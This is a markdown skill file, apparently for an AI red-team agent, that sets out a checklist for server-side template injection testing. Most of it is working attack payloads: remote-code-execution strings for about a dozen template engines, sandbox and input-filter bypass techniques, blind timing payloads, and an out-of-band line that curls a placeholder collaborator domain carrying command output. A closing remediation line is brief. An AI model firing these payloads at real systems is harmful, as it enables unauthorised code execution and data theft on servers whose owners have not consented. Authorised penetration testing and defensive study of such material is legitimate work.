---
name: ssti-testing
description: Server-side template injection detection, engine identification, and RCE
origin: RedteamOpencode
---

# Server-Side Template Injection (SSTI) Testing

## When to Activate

- User input rendered in dynamic templates (emails, PDFs, pages)
- Reflected input shows template-like behavior
- Error messages reveal template engine names or syntax

## Tools

- run_tool curl / Burp Suite Repeater
- tplmap (automated SSTI exploitation)
- SSTImap
- Custom polyglot payloads

## Methodology

### 1. Detect Template Injection

- [ ] Inject math probe: `{{7*7}}` — look for `49` in response
- [ ] Alternate syntaxes: `${7*7}`, `<%= 7*7 %>`, `#{7*7}`, `{7*7}`, `[= 7*7 ]`
- [ ] String concat: `{{'foo'+'bar'}}` → `foobar`
- [ ] Polyglot: `${{<%[%'"}}%\.`  — observe which causes errors
- [ ] Check URL params, POST body, headers, cookie values

### 2. Identify Template Engine

#### Jinja2 / Python

- [ ] `{{config}}` — dumps Flask config
- [ ] `{{config.items()}}` — enumerate settings
- [ ] `{{self.__class__.__mro__}}` — MRO chain
- [ ] `{{request.application.__globals__}}`

#### Twig / PHP

- [ ] `{{_self.env.getFilter('id')}}` (Twig <2)
- [ ] `{{['id']|filter('system')}}` (Twig 3)
- [ ] `{{app.request.server.all|join(',')}}` — server vars

#### Freemarker / Java

- [ ] `${7*7}` → `49`
- [ ] `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}`
- [ ] `${object.class.forName("java.lang.Runtime")}`

#### Pebble / Java

- [ ] `{% set cmd = 'id' %}{% set bytes = (1).TYPE.forName('java.lang.Runtime').methods[6].invoke(null,null).exec(cmd) %}`

#### Thymeleaf / Java

- [ ] `__${T(java.lang.Runtime).getRuntime().exec('id')}__::.x`
- [ ] URL path-based injection in Spring Boot

#### ERB / Ruby

- [ ] `<%= 7*7 %>` → `49`
- [ ] `<%= system('id') %>`
- [ ] `<%= `id` %>`

#### Smarty / PHP

- [ ] `{php}echo `id`;{/php}` (Smarty <3)
- [ ] `{system('id')}`

#### Handlebars / Pug / EJS (Node.js)

- [ ] Handlebars: `{{#with "s" as |string|}}{{#with "e"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub "constructor")}}{{this.pop}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push "return require('child_process').execSync('id');"}}{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}` — known Handlebars sandbox-escape gadget (version-dependent, confirm signal before pasting whole chain)
- [ ] Pug: `#{root.process.mainModule.require('child_process').execSync('id')}`
- [ ] EJS: `<%- global.process.mainModule.require('child_process').execSync('id') %>` (server-side `render` with attacker-controlled template string, e.g. via `ejs.render(userInput)`)

#### Velocity / Java

- [ ] `#set($e="e")$e.getClass().forName("java.lang.Runtime").getMethod("exec",$e.getClass()).invoke($e.getClass().forName("java.lang.Runtime").getMethod("getRuntime").invoke(null),"id")`

#### Go `html/template` / `text/template`

- [ ] `{{.}}` reflects struct fields; RCE is rare (no arbitrary code exec by design) but SSRF/logic-bypass via injected pipeline functions is possible if custom `FuncMap` exposes dangerous helpers (`exec`, `readFile`) — enumerate `{{ printf "%T" . }}` to fingerprint exposed context.

#### Django Templates (Python)

- [ ] Native DTL is intentionally logic-less (no arbitrary attribute chains); test whether the app mixed in Jinja2 for a subset of views, and whether `{% debug %}` or a custom filter reachable from input exposes settings/env.

### 3. Exploitation — RCE

- [ ] Jinja2: `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}`
- [ ] Twig: `{{['id']|filter('system')}}`
- [ ] Freemarker: `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}`
- [ ] ERB: `<%= `whoami` %>`
- [ ] Confirm with `id`, `whoami`, then escalate

### 4. Sandbox Escape

- [ ] Jinja2: walk MRO to find `subprocess.Popen` or `os.popen`
- [ ] Restricted engines: enumerate available objects and methods
- [ ] Chain gadgets through `__subclasses__()`, `__globals__`, `__builtins__`
- [ ] Jinja2 quote-filtered bypass: when `'` or `"` are stripped, build strings via `request|attr('application')` chains or `{{ ''.__class__.__mro__[1].__subclasses__() }}` using `.` attribute access instead of `[]` subscript (some filters only block one form)
- [ ] Jinja2 `config`/`self` filtered: pivot through other always-present globals — `{{ lipsum.__globals__.os.popen('id').read() }}` (`lipsum` is a default Jinja2 global even when `config`/`request` are sandboxed out) or `{{ cycler.__init__.__globals__.os.popen('id').read() }}`
- [ ] Numeric-only subclass index (no literal string needed) to dodge string-content filters: iterate `__subclasses__()` by index until the `subprocess.Popen` or `os._wrap_close` class is found, then invoke without ever typing `os`/`subprocess`/`popen` as a literal substring
- [ ] Length-limited payload chaining: if input length is capped, stage the gadget across multiple parameters/requests that each set a template variable, then trigger a final short render call

### 5. Blind SSTI

- [ ] Time-based (Jinja2, no native sleep): `{% for i in range(100000000) %}{% endfor %}` heavy-loop timing, or `{{ ''.__class__.__mro__[1].__subclasses__()[<idx>]('sleep 5',shell=True,stdout=-1).communicate() }}` if a Popen-capable subclass is reachable
- [ ] Time-based (Freemarker): `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("sleep 5")}`
- [ ] Time-based (Twig): `{{ ['sleep 5']|filter('system') }}`
- [ ] Out-of-band: DNS/HTTP callback from template execution, e.g. `{{ self.__init__.__globals__.os.popen('curl http://COLLAB_DOMAIN/`id`').read() }}`
- [ ] Error-based: force errors that leak data (undefined attribute chains, division by zero inside the template, malformed filter arguments) and diff the stack trace against a baseline error for engine/version fingerprinting

## What to Record

- Parameter and endpoint where SSTI confirmed
- Template engine and version identified
- Proof payload and output
- Whether sandbox was present and bypassed
- RCE achieved (yes/no) with evidence
- Severity: Critical (RCE) or High (info leak)
- Remediation: use logic-less templates, sandbox, never pass raw user input to template render
